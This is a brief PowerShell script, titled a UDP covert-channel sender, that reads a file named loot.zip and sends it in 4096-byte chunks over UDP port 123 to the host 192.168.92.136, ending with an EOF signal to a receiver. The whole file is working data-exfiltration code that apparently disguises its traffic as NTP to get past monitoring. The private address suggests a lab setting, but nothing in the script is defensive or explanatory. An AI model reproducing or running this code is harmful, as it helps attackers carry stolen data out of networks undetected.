# UDP Covert Channel - Sender
# Reads loot.zip and transmits in 4096 byte chunks over UDP port 123
# Sends EOF signal upon completion to trigger receiver file write

$file = [System.IO.File]::ReadAllBytes("C:\temp\loot.zip")
$client = New-Object System.Net.Sockets.UdpClient
$client.Connect("192.168.92.136", 123)
for ($i = 0; $i -lt $file.Length; $i += 4096) {
    $chunk = $file[$i..[Math]::Min($i+4095,$file.Length-1)]
    $client.Send($chunk, $chunk.Length) | Out-Null
}
$client.Send([System.Text.Encoding]::ASCII.GetBytes("EOF"), 3) | Out-Null
